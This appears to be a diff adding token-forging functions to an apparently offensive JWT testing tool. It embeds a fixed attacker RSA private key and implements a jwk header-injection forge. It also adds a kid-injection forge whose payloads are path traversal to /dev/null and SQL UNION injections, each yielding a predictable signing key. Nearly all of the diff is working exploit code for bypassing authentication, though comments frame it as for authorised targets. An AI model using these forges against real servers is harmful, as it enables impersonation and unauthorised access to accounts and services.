@@ -209,6 +209,98 @@ def jwk_to_pems(jwk: dict) -> list[str]:
     return [_pem(spki, "PUBLIC KEY"), _pem(pkcs1, "RSA PUBLIC KEY")]
 
 
+# A FIXED attacker-owned RSA-2048 keypair, generated once offline and embedded so no
+# key generation (and therefore no `cryptography` dependency) happens at runtime. It is
+# the key WE control: the jwk/kid forges below embed its PUBLIC half in the token and sign
+# with its PRIVATE half, so a server that trusts a key the token names verifies OUR
+# signature. It signs nothing real — only proof tokens against an authorised target.
+_ATTACKER_N = 0xc33702cb891df4aa1079a87fb449be2d409b015d296560034eab918c7af79012cce88199525e9d888606696362fe156fe838348dc24e26d3d89e7796ecff122cb43b241ff4bdbd99e8eb1d4bec892172e3d49a69eacc1091bd28950dc2224b04d1235a1ea6d19ca498ad5a65ef187c6837b82705c5562fdae11e0f352170367640ae72941ba7932294a1243560545dc8e905c2647ad01e1abb2ec2eaedc86eda77b0f22f7aa32dcb18bec2e9a54b1f4af6fa7bb3b8585302a6117ab1dfb82ad03aa189e4e452640fb87cd32e7ca30a843d19265c9d5ba88d6512d1173087d4758f0714be7d7dba9a331f88c49b48267615be2bed030cac5e81f8516b118669e5
+_ATTACKER_E = 65537
+_ATTACKER_D = 0x1bc2eefad2fd179637d1954cd3eec8c4d6b3347673349f7ad8ed3d3da51f1fb60cbde3f051ee72a8bfa699c63085c1b6b0678dd1bb18321d5e68eac8e3db4252692f1fec0b7a10449b03149f7f7be0edddc8964d09bf0b7c2e525f201dc392b794a65a629186ada81aae4c74c293d0dd614f26fd831ac6a371f03c6969dff35e8df4b777d24b7b4422f2398570058a0517269023a298fab326035c94654c68935abb3bac1967dbb3ddaafec52ce67a3b3520e8bbe7742e41bb5beeee1f4d571b025886d634958784553a7158a370d1dd17cc286cb1f6cc3ec9429990f2fddb206b62230626be48f8314775feb5dd94cfaf29ec04759a1299682c8d0ac2804ae1
+
+# SHA-256 DigestInfo prefix (the ASN.1 that precedes the hash in an RSASSA-PKCS1-v1_5
+# signature) — RFC 8017 §9.2.
+_SHA256_DIGEST_INFO = bytes.fromhex("3031300d060960864801650304020105000420")
+
+
+def _rs256_sign_with_attacker_key(signing_input: bytes) -> bytes:
+    """RSASSA-PKCS1-v1_5 over SHA-256 with the embedded attacker private key — pure Python
+    (RFC 8017 EMSA-PKCS1-v1_5 padding, then modular exponentiation). This is normal RSA
+    signing done by hand; only the KEY is ours."""
+    k = (_ATTACKER_N.bit_length() + 7) // 8
+    t = _SHA256_DIGEST_INFO + hashlib.sha256(signing_input).digest()
+    ps = b"\xff" * (k - len(t) - 3)                      # pad to a full modulus block
+    em = b"\x00\x01" + ps + b"\x00" + t
+    m = int.from_bytes(em, "big")
+    s = pow(m, _ATTACKER_D, _ATTACKER_N)
+    return s.to_bytes(k, "big")
+
+
+def _attacker_public_jwk() -> dict:
+    """The public half of the embedded key as an RSA JWK — what an attacker plants in the
+    token header for a server to (wrongly) verify against."""
+    def _uint(v: int) -> str:
+        return _b64e(v.to_bytes((v.bit_length() + 7) // 8, "big"))
+    return {"kty": "RSA", "n": _uint(_ATTACKER_N), "e": _uint(_ATTACKER_E)}
+
+
+def jwk_injection_token(token: str) -> str | None:
+    """The `jwk` header-injection forge (CVE class; PortSwigger "JWT header injections").
+
+    A server that reads the verification key from the TOKEN's own `jwk` header — instead of
+    a trusted key store — will verify against whatever public key the attacker embeds. Here
+    we plant OUR public key in the header and sign the same claims (RS256) with OUR private
+    key, so a claim the server never issued is accepted. Only meaningful for an asymmetric
+    original; an HS token names no key to inject. Returns None if the token does not decode."""
+    parsed = decode(token)
+    if parsed is None:
+        return None
+    header, payload, _si, _sig = parsed
+    if not str(header.get("alg", "")).upper().startswith(("RS", "ES", "PS")):
+        return None
+    hdr = {**header, "alg": "RS256", "jwk": _attacker_public_jwk()}
+    hdr.pop("kid", None)                                  # our jwk is the key, not a stored kid
+    h = _b64e(json.dumps(hdr, separators=(",", ":")).encode())
+    p = _b64e(json.dumps({**payload, "exp": int(time.time()) + 3600},
+                         separators=(",", ":")).encode())
+    sig = _rs256_sign_with_attacker_key(f"{h}.{p}".encode())
+    return f"{h}.{p}.{_b64e(sig)}"
+
+
+# kid values that make the server verify against a key the attacker can predict. Each pairs
+# a header `kid` with the HMAC secret the server would then load for it.
+_KID_INJECTIONS = (
+    # Path traversal to an empty/predictable file -> the "key" is that file's bytes.
+    ("../../../../../../../../dev/null", b""),
+    ("../../../../../../../../../../dev/null", b""),
+    ("/dev/null", b""),
+    # SQL injection in a `kid` looked up in a DB -> UNION returns an attacker-known key.
+    ("nonexistent' UNION SELECT 'brukal_kid_key'-- -", b"brukal_kid_key"),
+    ("x' UNION SELECT 'AA'-- -", b"AA"),
+)
+
+
+def kid_injection_tokens(token: str) -> list[tuple[str, str]]:
+    """(kid, forged_token) — the `kid` header-injection forge. When the server uses the
+    header's `kid` to LOCATE its verification key (a file path, a DB row), a traversal to an
+    empty file or a SQL injection makes the key a value the attacker controls; the token is
+    then HS256-signed with that predictable key. Independent of the original algorithm: the
+    forced `alg` is HS256 and the secret is whatever the poisoned lookup yields."""
+    parsed = decode(token)
+    if parsed is None:
+        return []
+    header, payload, _si, _sig = parsed
+    out: list[tuple[str, str]] = []
+    for kid, key in _KID_INJECTIONS:
+        hdr = {**header, "alg": "HS256", "kid": kid}
+        h = _b64e(json.dumps(hdr, separators=(",", ":")).encode())
+        p = _b64e(json.dumps({**payload, "exp": int(time.time()) + 3600},
+                             separators=(",", ":")).encode())
+        sig = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
+        out.append((kid, f"{h}.{p}.{_b64e(sig)}"))
+    return out
+
+
 def confusion_tokens(token: str, public_pems) -> list[tuple[str, str]]:
     """(pem, forged_token) — the RS256->HS256 confusion forge. The token is re-signed as
     HS256 using each candidate public-key PEM as the HMAC secret. A server that does not
